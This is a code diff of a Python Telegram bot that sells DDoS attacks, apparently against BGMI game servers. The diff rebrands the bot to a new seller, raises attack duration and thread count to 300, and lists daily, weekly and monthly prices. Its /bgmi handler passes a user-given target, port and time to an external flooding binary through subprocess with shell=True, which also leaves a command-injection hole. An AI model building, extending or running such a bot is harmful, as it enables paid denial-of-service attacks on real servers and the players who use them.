@@ -100,10 +100,10 @@ def add_user(message):
             else:
                 response = "User already exists 🤦‍♂️."
         else:
-            response = "Please specify a user ID to add 😒."
+            response = "Please specify a user ID to add 😒 ."
     else:
-        response = "Only Admin Can Run This Command 😡."
-
+        response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
+ 
     bot.reply_to(message, response)
 
 
@@ -127,7 +127,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Pahle @BhaiCharaYT Bhai Se Puch Ke Aa 😡."
 
     bot.reply_to(message, response)
 
@@ -147,7 +147,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Panle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
     bot.reply_to(message, response)
 
  
@@ -173,7 +173,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
     bot.reply_to(message, response)
 
 
@@ -192,7 +192,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
         bot.reply_to(message, response)
 
 
@@ -223,7 +223,7 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                 response = "You Are On Cooldown ❌. Please Wait 5 second Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
@@ -235,19 +235,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time >300:
+                response = "Error: Time interval must be less than 300."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ You Are Not Authorized To Use This Command ❌."
+        response = "❌ Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se ❌."
 
     bot.reply_to(message, response)
 
@@ -269,8 +269,8 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command 😡."
-
+        response = "Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se 😡."
+ 
     bot.reply_to(message, response)
 
 
@@ -285,8 +285,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @kushwaha_307,@DivinexAv
-Official Channel :- t.me/RX100OFFIiCIAL
+Buy From :- @BhaiCharaYT
+Official Channel :- https://t.me/+HTYKRNXHpZpmOGU9
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -301,9 +301,9 @@ Official Channel :- t.me/RX100OFFIiCIAL
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    response = f'''👋🏻Welcome to @BhaiCharaYTDdosBOT, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- t.me/RX100OFFIiCIAL'''
+✅Join :- https://t.me/+HTYKRNXHpZpmOGU9'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -322,9 +322,9 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
+-> Attack Time : 300 (S)
 > After Attack Limit : 5 Min
--> Concurrents Attack : 3
+-> Concurrents Attack 300
 
 Pr-ice List💸 :
 Day-->300 Rs
@@ -332,7 +332,6 @@ Week-->1000 Rs
 Month-->2000 Rs
 '''
     bot.reply_to(message, response)
-
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
@@ -366,7 +365,7 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
 
     bot.reply_to(message, response)
 
